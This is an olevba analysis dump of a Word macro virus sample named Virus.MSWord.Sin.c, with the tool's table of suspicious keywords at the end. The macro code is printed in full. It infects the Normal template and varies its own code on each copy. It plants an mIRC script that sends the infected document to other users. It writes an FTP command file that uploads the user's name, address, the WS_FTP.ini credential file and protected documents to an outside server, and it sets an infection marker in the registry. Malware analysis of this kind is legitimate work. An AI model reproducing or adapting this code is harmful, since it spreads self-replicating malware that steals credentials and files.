olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sin.c-c81159fb5c3f4f8cee60b705593f4ac32ca3d6f8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sin.c-c81159fb5c3f4f8cee60b705593f4ac32ca3d6f8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
FHUSKIXUBSB:  Options.SaveNormalPrompt = False
GMUPAVB:  Randomize Timer
SMPLUULM:  LordArz = "Technological Illusions"
OOOOOO = UUUUUU
CFUTJHUEDFO:  NormInstalled = False
WEXYEXFSEF:  ActInstalled = False
WWLEASRN:  Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
P = II
FTHPOBOK:  Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
MUAVFYVTLP:
FOUAVMSNNUA:  NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
DKHRQWTMY:  AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
GBFSIOFIEK:
YIOYNCKGJRK:  If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True
VVGHWNDVNRP:  If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True
FLNGWGMF:
YGKRRUA:  If NormInstalled = False Then
CXLBDBWTKFR:      Set Infection = NormCarrier
MYXEQPOR:      Set Carrier = ActCarrier
MMM = WWW
RYOLEK:  Else
YFHSPSPGOJ:      Set Infection = ActCarrier
CDLDJGIYU:      Set Carrier = NormCarrier
KPUNGOUGIE:  End If
LBNVPIRNG:
ECBMAUO:
GNTIWQIGMVB:
TVVYFXCQFKS:  DoEvents
WWWWW = RRR
NESQKHFD:
OCVIRI:  Close
RJQONLUA:  Tr1 = Dir(CurDir & "\script.ini", vbNormal)
YAKWQOFDH:  Tr2 = UCase(Right(CurDir, 8))
PPPPPP = OOOOOO
DPMTMCQAYH:  Tr3 = Dir("C" & Chr(58) & "\MIRC", vbDirectory)
CKYPUICTVV:
DDDDDD = MMMMMM
TXRMBWKVVC:  If Tr1 <> "" Then SDir = CurDir & "\script.ini"
DMXARFM:  If Tr2 = "DOWNLOAD" Then SDir = CurDir & "\..\Script.ini"
KENUEHFST:  If Tr3 <> "" Then SDir = "C" & Chr(58) & "\MIRC\Script.ini"
GGIWCFLSD:
PARODYH:  If SDir <> "" Then
WUOMMQKHFL:      Open SDir For Output As #1
SVIHHCB:      Print #1, "n0=on 1" & Chr(59) & "JOIN" & Chr(59) & "#" & Chr(59) & "if ( $me != $nick ) { /dcc send $nick " & ThisDocument.FullName & " }"
AMKUMTXORTJ:      Close #1
SKNHHL:  End If
NJWTRAXB:  DoEvents
VAWAQJWDEJJ:
QCBODS:  WinPath = Environ("WINDIR")
JJ = VV
AHHCQOX:
KORWJNJKEG:  If Application.Tasks.Exists("Sockets Window") = True And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "" Then
YFHFSE:      With Application.FileSearch
CCCC = RRR
AJYKITXFW:              .FileName = "WS_FTP.ini"
OPXVWA:              .LookIn = "C" & Chr(58) & "\"
BWRIOEHGVJV:              .SearchSubFolders = True
SQRVFIKLGW:              .MatchTextExactly = True
ACHSWBVWEHJ:              .FileType = msoFileTypeAllFiles
QDNMXADLHKM:              .Execute
QNKFPOYU:              WsPath = .FoundFiles(1)
QQKGGS:      End With
AMSFWLF:
QHXFRK:      DoEvents
QBXXVQV:
RPMUYO:      If ActiveDocument.HasPassword = True Then BCK = True
GKYFAL:
MPDAGG:      DoEvents
LPFAVEMQW:      Open WinPath & "\" & Application.UserName & ".dat" For Output As #10
JWILUVRD:      Print #10, Application.UserName
K = PP
DVEWYTD:      Print #10, Application.UserAddress
ICPAJP:      If BCK = True Then Print #10, ActiveDocument.FullName
HCKNQVQNT:      If WsPath <> "" Then Print #10, "WS_FTP"
XUSNYTXYPFR:      Close #10
PPPPPP = PPPPP
UGOCOVFE:      Open WinPath & "\Command.$$$" For Output As #8
VMHQLBVRQ:      Print #8, "o ftp.xoom.com"
CDGXMEQ:      Print #8, "User SingOfScream"
MMQUKVSIXHQ:      Print #8, "Pass DIG001"
CDCDTGSSV:      Print #8, "binary"
BBB = XXXXXX
CTKKXEVQSGC:      Print #8, "put " & Application.UserName & ".dat"
XFUYWRR:      If WsPath <> "" Then Print #8, "put " & WsPath
XEWXWR:      If BCK = True Then Print #8, "put " & ActiveDocument.FullName
BCTVRVNMG:          Print #8, "quit"
WCVRDJBGJJ:      Close
FUGILSRSHF:      Shell WinPath & "\FTP.exe -n -s:Command.$$$"
KUCANVEQ:      MsgBox "file sent"
JCXAAM:      System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "Your PC is infected  (UP THE IRONS)"
JBYUHEAUF:  End If
J = C
EXYILKMVPUB:  For x = 1 To ThisDocument.Variables.Count
AXQQAD:      ThisDocument.Variables(x).Delete
OOCOAHDILA:  Next x
CCVBAN:  For x = 1 To Normal.ThisDocument.Variables.Count
XFJLHQMCXSU:      Normal.ThisDocument.Variables(x).Delete
SGJWTGCT:  Next x
DLBENHV:
MFCBFVEGV:  With Carrier
LWTYQPYONIF:      UECode = .Lines(1, 2) & Chr(13)
RMITMPQVI:      For x = 5 To .CountOfLines - 1
UYREOPYWW:          VCCode = .Lines(x, 1)
VTYMDNJTYWQ:          If VCCode = "End Sub" Then Exit For
QWAQFEKR:          For i = 1 To 20
HDLYYSANCJF:              If Mid(VCCode, i, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - i)
XAGFOL:          Next i
GETFOBVX:          factor = ""
HVMHSCL:          For Y = 1 To Int(Rnd * 6) + 6
SCHTEA:              factor = factor & Chr(Int(Rnd * 25) + 65)
RR = QQQ
ECEKIYTCXJ:          Next Y
MUMPYDRQ:          make_morph = factor & ": "
MMMM = RRRRR
BMIVXOBV:
NITSCY:          VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
KPLLGTDJ:          If Int(Rnd * 10) > 7 Then VirCode = VirCode & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & " = " & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & Chr(13)
ELDEKLH:      Next x
ERPGEYFMMA:      VirCode = UECode & VirCode & "End Sub"
USMOAQ:  End With
OHQTRFHXHSE:
SJDVUDIF:  Normal.ThisDocument.Variables.Add "VCode", VirCode
NTOWHBUBRN:
RRR = OO
KJUBGAWEEKF:  ResetMe = "Private Sub Document_Close()" & Chr(13)
PWAMNEJAK:  ResetMe = ResetMe & String(150, Chr(9)) & "If ShowVisualBasicEditor= true then exit sub: With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save" & Chr(13)
PNQBHAVVVW:  ResetMe = ResetMe & "End Sub"
VTSBFEIGWN:
VKQLDUW:  With ActCarrier
VQBBOSHCF:          .DeleteLines 1, .CountOfLines
NNYBEJHNMSU:          .InsertLines 1, ResetMe
SESBCFNH:  End With
YHUWHC:
XTAFEAIIY:  With NormCarrier
ORHRVQDYVPV:      .DeleteLines 1, .CountOfLines
IMNXTSG:      .InsertLines 1, ResetMe
WYEMOHMC:  End With
CYFQWU:
NN = DDDDDD
BPBLNVWOJ:  ActiveDocument.Save
HH = YYY
OBMFTXIDVL:  NormalTemplate.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Sin.c-c81159fb5c3f4f8cee60b705593f4ac32ca3d6f8 - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    MsgBox "No Netbus server found in the memory"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |FTP.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

